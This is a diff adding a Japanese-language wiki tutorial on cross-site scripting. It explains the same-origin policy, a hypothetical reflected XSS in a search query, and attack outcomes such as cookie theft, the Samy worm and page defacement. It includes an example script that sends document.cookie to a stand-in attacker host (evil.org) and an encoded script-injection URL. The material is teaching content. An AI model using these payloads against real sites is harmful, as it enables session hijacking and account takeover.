@@ -1,0 +1,84 @@
+#summary クロスサイドスクリプティング脆弱性入門
+#labels about-security,is-article
+||[ArticleIntroductionToXSS English]||[EsArticleIntroductionToXSS Español]||[FrArticleIntroductionToXSS Français]||
+||[JaWelcome Home]||||[JaArticlesXSS Webセキュリティ]||
+
+Webブラウザは[http://www.mozilla.org/projects/security/components/same-origin.html Same Origin Policy]と呼ばれるポリシーに依って実装されていて、文書に含まれるJavaScriptやVBScriptなどのスクリプトは特定のドメイン(基本的には呼び出したページと同一のドメイン)にしかアクセスできません。
+すなわち、スクリプトが読み込まれた文書と同じドメインに関連するプロパティ(CookieやDOMオブジェクトなど)にしかアクセスできません。このポリシーは悪意をもったドメイン(ここでは www.evil.org とします)がgoogle.comのCookieにアクセスすることを防ぐために必要です。
+
+しかしながら、もしgoogle.comからの応答の中に、evil.orgが意図したスクリプトが含まれるように細工ができ、www.evil.orgのサイトを表示することで(iframeやimgタグなどにより)読み込ませることができると仮定したとすれば、evil.orgがgoogle.comからの応答に注入(以下、インジェクションといいます)したスクリプトによりgoogle.comのcookieを盗み出すことができるでしょう。evil.orgにある悪意のあるページを閲覧することにより、閲覧者に被害を及ぼす、XSS脆弱性はこのような事態を引き起こします。
+
+== 脆弱性の例 ==
+Googleに `http://www.google.com/search?q=flowers` というリクエストが投げられると、Googleは下記のようなHTMLドキュメントを返します。以下はその抜粋: 
+{{{
+...
+  <p>'flowers'の検索結果:</p>
+...
+
+}}}
+
+すなわち、クエリー`q`の値はGoogleが返すページに挿入されます。(そんなことはGoogleではあり得ませんが)もし入力値がバリデート(検証)されたりエスケープされないと仮定すれば...
+
+Evil.org が下記のようなURLをブラウザに(見えない<iframe>などで)読み込ませたとすれば
+{{{
+http://www.google.com/search?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E
+}}}
+
+被害者が `www.evil.org` からのページを読み込んだとき、ブラウザは上記のiframeをロードします。iframeにロードされた文書は下記のようなコンテントを含みます。以下はその抜粋:
+{{{
+<p>'flowers <script>evil_script()</script>'の検索結果:</p>
+
+}}}
+
+このページを読み込むことで、ブラウザは関数 `evil_script()` を実行します。その上に、このスクリプトは `www.google.com` から読み込まれたページ上で実行されるのです！
+
+== XSS攻撃例と威力 ==
+
+悪意を持った攻撃について、いくつかの攻撃の例を下記に挙げます。
+
+=== Cookie の窃取 ===
+
+攻撃者が以下のソースを挿入することで:
+{{{
+<script>
+  i=new Image();
+  i.src="http://www.evil.org/snarf?cookie=" + escape(document.cookie);
+</script>
+}}}
+
+evil.org のサーバに対して被害者が持つGoogleのcookieをURLに持つリクエストが送信され、攻撃者は evil.org のwebサーバログを見ることで、被害者のGoogle cookieを見つけることができます。
+
+例として、もし盗まれたcookieに被害者のGmailに関する全てのcookieが含まれていたとしたら、攻撃者は自分のブラウザにそれらのcookieをすべてペーストすることで、被害者のGmailのアカウントにフルアクセスできることになります。
+
+=== 脆弱なアプリケーションの操作 ===
+
+攻撃はcookieの窃取や、それによる(Gmailなどの)アプリケーションへのアクセス権の獲得を望んでいないかもしれません。他の攻撃として、例えばスクリプトを挿入することで不正なアクション(メールを送信する、メールを読み込み攻撃者のサイトに転送するなど)を被害者のセッションで行うことなどが想定されます。
+
+興味深い例として、"Samy"とよばれるワームがソーシャルネットワーキングサイトのMySpaceに出現しました。このワームはMySpaceが持つXSS脆弱性を用いて、Samyというユーザを友人に追加し、マイスペースでのフレンドリンクを増殖させていきました。
+
+=== アプリケーションのユーザインタフェースを書き換える ===
+三番目の可能性として、攻撃者が脆弱性のあるサイトに読み込ませたスクリプトにより、サイトの内容を改変させる攻撃が想定されます。このケースでは被害者がソーシャルエンジニアリングの攻撃(たとえばパスワードやクレジットカード番号を入力させて窃取される)に遭う可能性があります。
+
+脆弱性のあるニュースサイトにて、インジェクト(注入)されたスクリプトによりサイトのトップに偽のニュースを合成されたという攻撃がデモンストレーションされたことがあります。
+
+== 不審なデータはどこから来るのか ==
+
+上記の例では、攻撃者が被害者が脆弱性のあるアプリケーションに渡すクエリパラメータにセットする値から有害なスクリプトを読み込ませるという方針でした。
+
+クエリのパラメータ(やフォームの値)は一般的でもっとも容易なXSS攻撃の手法ですが、攻撃者の生御歌にあるあらゆるデータによってHTMLに文章が挿入される場面においてXSS脆弱性は成立します。下記はその一例ですが、これに限定されません。
+
+  * URLのクエリ パラメータ
+  * URLのパス("Document not found"の404エラーメッセージに含まれます)
+  * フォームフィールド (隠しフィールドも含みます)
+  * Cookie
+  * 他のHTTPリクエストヘッダ (リファラURLなど)
+  * 他のユーザからのやりとりによりあらかじめ保存されたデータ (Googleグループのメッセージ, Orkut, GMailなど).
+  * 外部から読み込まれたデータ (Google Product Searchで出品者が出力したデータ)
+  * Web (Google検索) や ローカルのディスク (Google デスクトップ) からクロールされたデータ
+
+== 参考文献 ==
+
+  * [JaArticleXSS クロスサイドスクリプティング(XSS)攻撃についてのまとめ]
+  * [http://www.mozilla.org/projects/security/components/same-origin.html Same Origin Policy]
+  * [http://it.slashdot.org/it/05/10/14/126233.shtml Cross-Site Scripting Worm Floods MySpace (slashdot.org)]
+
